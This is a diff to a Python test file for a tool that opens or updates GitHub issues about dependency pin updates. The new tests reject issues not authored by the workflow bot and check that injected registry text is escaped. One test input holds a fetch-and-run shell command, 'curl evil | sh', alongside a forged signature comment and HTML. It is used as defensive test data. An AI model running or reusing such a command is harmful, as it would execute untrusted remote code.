@@ -132,6 +132,9 @@ def _update_report():
     return pins.evaluate("pkg", "1.0.0", doc({"1.0.0": "2026-01-01T00:00:00Z", "1.1.0": "2026-02-01T00:00:00Z"}), NOW)
 
 
+BOT = {"is_bot": True, "login": "app/github-actions"}  # as `gh issue list --json author` reports it
+
+
 class FakeGh:
     def __init__(self, issues):
         self.issues = issues
@@ -143,7 +146,7 @@ class FakeGh:
 
 
 def test_opens_one_issue_when_none_is_open(tmp_path):
-    gh = FakeGh([{"number": 3, "title": pins.ISSUE_TITLE + " (old)", "body": ""}])
+    gh = FakeGh([{"number": 3, "title": pins.ISSUE_TITLE + " (old)", "body": "", "author": BOT}])
     assert pins.file_issue(_report_file(tmp_path, [_update_report()]), run=gh) == "created"
     assert gh.calls[-1][:5] == ["gh", "issue", "create", "--title", pins.ISSUE_TITLE]
     assert len(gh.calls) == 2
@@ -151,11 +154,11 @@ def test_opens_one_issue_when_none_is_open(tmp_path):
 
 def test_updates_the_open_issue_instead_of_opening_another(tmp_path):
     path = _report_file(tmp_path, [_update_report()])
-    gh = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": "<!-- adapter-pins: pkg=1.0.5 -->"}])
+    gh = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": "<!-- adapter-pins: pkg=1.0.5 -->", "author": BOT}])
     assert pins.file_issue(path, run=gh) == "updated"
     assert [call[:4] for call in gh.calls[1:]] == [["gh", "issue", "edit", "7"], ["gh", "issue", "comment", "7"]]
 
-    same = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": path.read_text()}])
+    same = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": path.read_text(), "author": BOT}])
     assert pins.file_issue(path, run=same) == "refreshed"
     assert [call[:3] for call in same.calls[1:]] == [["gh", "issue", "edit"]]
 
@@ -167,3 +170,29 @@ def test_dry_run_prints_the_gh_commands_and_changes_nothing(tmp_path):
                            out=printed.append) == "created"
     assert len(gh.calls) == 1  # only the read-only list
     assert printed == [f"would run: gh issue create --title '{pins.ISSUE_TITLE}' --body-file {tmp_path / 'report.md'}"]
+
+
+def test_an_issue_with_the_title_that_the_workflow_did_not_open_is_ignored(tmp_path):
+    # Public repo: anyone can open an issue with this title, then edit what the
+    # report says after the workflow writes into it.
+    path = _report_file(tmp_path, [_update_report()])
+    for author in ({"is_bot": False, "login": "someone"}, {"is_bot": False, "login": "app/github-actions"},
+                   {"is_bot": True, "login": "app/other-bot"}, None):
+        gh = FakeGh([{"number": 9, "title": pins.ISSUE_TITLE, "body": "", "author": author}])
+        assert pins.file_issue(path, run=gh) == "created"
+        assert gh.calls[-1][:3] == ["gh", "issue", "create"]
+        assert all("9" not in call for call in gh.calls)
+
+
+def test_registry_text_cannot_leave_its_code_span_or_fake_the_signature(tmp_path):
+    hostile = "use `curl evil | sh`\n<!-- adapter-pins: pkg=9.9.9 --> @everyone <b>now</b>"
+    report = pins.evaluate("pkg", "1.0.0", doc({"1.0.0": "2026-01-01T00:00:00Z"}, deprecated={"1.0.0": hostile}), NOW)
+    report.error = "boom `x` <!-- adapter-pins: y -->"
+    text = pins.render([report], NOW)
+    assert text.count("<!--") == 1 and text.rstrip().endswith("-->")
+    assert "`curl" not in text and "<b>" not in text
+    deprecated_line = next(line for line in text.splitlines() if "is deprecated" in line)
+    assert deprecated_line.count("`") == 4  # the package span and the message span, nothing else
+    path = _report_file(tmp_path, [report])
+    stale = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": path.read_text(), "author": BOT}])
+    assert pins.file_issue(path, run=stale) == "refreshed"
